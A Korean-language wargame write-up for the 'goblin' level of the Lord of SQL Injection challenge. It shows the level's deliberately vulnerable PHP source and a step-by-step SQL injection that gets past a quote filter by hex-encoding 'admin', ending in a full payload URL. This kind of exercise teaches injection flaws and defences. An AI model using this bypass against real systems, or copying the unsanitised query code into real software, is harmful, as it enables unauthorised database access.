# Los.eagle-jump.org-3
* 3번 문제 [goblin]
```javascript
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```
쿼리문
```
query : select id from prob_goblin where id='guest' and no=
```


* Solution [쿼리를 이용해 로그인 시도]

1. php 소스를 보면 ',",` 등을 사용하지 못한다

2. 특정문자를 제외하고 파라미터를 작성

3. https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0 or id=admin

4. 0일떄는 참 1일떄는 거짓이므로 no=0, id는 if($result['id'] == 'admin') solve("goblin"); 이므로 id=admin

5. 위에 파라미터를 입력시 작동이되지않는다

6. ',",`을 사용하지않으면 admin을 인식하지못하므로 16진수로 변환 => 61646D696E

7. 0x를 사용하여 hex값임을 인식시켜준다

8. 정답: https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0 or id=0x61646D696E
